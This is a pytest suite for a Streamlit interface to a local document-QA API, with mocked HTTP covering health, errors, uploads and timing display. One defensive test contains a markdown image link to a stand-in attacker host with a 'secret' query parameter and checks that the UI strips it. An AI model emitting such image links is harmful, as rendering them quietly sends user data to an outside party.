from pathlib import Path

import httpx
import pytest
from streamlit.testing.v1 import AppTest

from ui.streamlit_app import ApiResult, ask, error_message, format_details, get_health, remove_images, upload

# HTTP is faked with httpx.MockTransport: no API, no Ollama, no browser.

APP_FILE = Path(__file__).resolve().parent.parent / "ui" / "streamlit_app.py"


def mock_client(handler) -> httpx.Client:
    return httpx.Client(base_url="http://api.test", transport=httpx.MockTransport(handler))


def respond(status: int, body) -> httpx.Client:
    return mock_client(lambda request: httpx.Response(status, json=body))


def test_health_ok_returns_data():
    body = {"status": "ok", "index_loaded": True, "chunks": 35, "llm_reachable": True, "model": "llama3.2:3b"}
    result = get_health(client=respond(200, body))
    assert result == ApiResult(ok=True, status=200, data=body)


def test_api_down_becomes_error_result_not_exception():
    def handler(request):
        raise httpx.ConnectError("connection refused")

    result = get_health(client=mock_client(handler))
    assert result.ok is False
    assert result.status is None
    assert "Cannot reach the API" in result.error


def test_api_timeout_becomes_error_result():
    def handler(request):
        raise httpx.ReadTimeout("slow")

    result = ask("anything", client=mock_client(handler))
    assert result.ok is False
    assert "did not answer" in result.error


def test_ask_sends_question_as_json():
    seen = {}

    def handler(request):
        seen["path"] = request.url.path
        seen["body"] = request.read()
        return httpx.Response(200, json={"answer": "x"})

    ask("How do I type a path parameter?", client=mock_client(handler))
    assert seen["path"] == "/ask"
    assert b'"question"' in seen["body"]


def test_ask_503_keeps_api_message():
    result = ask("q", client=respond(503, {"detail": "Cannot reach Ollama at http://localhost:11434/api/chat. Is it running?"}))
    assert result.ok is False
    assert result.status == 503
    assert "Ollama" in result.error


def test_ask_abstained_answer_is_ok_not_error():
    body = {"answer": "I couldn't find this in the documents.", "abstained": True, "sources": []}
    result = ask("What is the capital of France?", client=respond(200, body))
    assert result.ok is True
    assert result.data["abstained"] is True


def test_422_list_becomes_one_readable_sentence():
    detail = [{"loc": ["body", "question"], "msg": "String should have at least 1 character"}]
    response = httpx.Response(422, json={"detail": detail})
    assert error_message(response) == "question: String should have at least 1 character"


def test_non_json_error_falls_back_to_status_code():
    assert error_message(httpx.Response(500, text="Internal Server Error")) == "HTTP 500"


@pytest.mark.parametrize("status", [409, 413, 415])
def test_upload_refusal_returns_api_reason(status):
    result = upload("x.exe", b"MZ", None, client=respond(status, {"detail": "File type not allowed"}))
    assert result.ok is False
    assert result.status == status
    assert result.error == "File type not allowed"


def test_upload_sends_multipart_file():
    seen = {}

    def handler(request):
        seen["type"] = request.headers["content-type"]
        seen["body"] = request.read()
        return httpx.Response(201, json={"filename": "notes.md", "bytes": 5, "message": "Saved."})

    result = upload("notes.md", b"hello", "text/markdown", client=mock_client(handler))
    assert result.ok is True
    assert seen["type"].startswith("multipart/form-data")
    assert b'filename="notes.md"' in seen["body"]


def test_format_details_shows_model_prompt_and_timings():
    text = format_details(
        {"model": "llama3.2:3b", "prompt_version": "v1", "timings_ms": {"retrieve": 638.7, "generate": 2009.1, "total": 2649.4}}
    )
    assert "llama3.2:3b" in text and "v1" in text
    assert "retrieve 639 ms" in text and "total 2649 ms" in text


def test_remove_images_blocks_silent_requests_but_keeps_text_and_code():
    answer = "Use `item_id: int` [guide.pdf, p. 1]. ![x](http://evil.example/?q=secret) See [docs](http://localhost)."
    cleaned = remove_images(answer)
    assert "evil.example" not in cleaned
    assert "[image removed]" in cleaned
    assert "`item_id: int` [guide.pdf, p. 1]" in cleaned
    assert "[docs](http://localhost)" in cleaned


def test_page_shows_clear_error_when_api_is_down(monkeypatch):
    # Port 9 (discard) on localhost: nothing listens there, so the connection is refused quickly.
    monkeypatch.setenv("API_URL", "http://127.0.0.1:9")
    page = AppTest.from_file(str(APP_FILE), default_timeout=30).run()

    assert not page.exception
    assert any("Cannot reach the API" in e.value for e in page.error)
    assert any("uvicorn app.api.main:app" in c.value for c in page.code)


def test_ui_never_imports_app_internals():
    source = APP_FILE.read_text(encoding="utf-8")
    assert "from app" not in source
    assert "import app" not in source
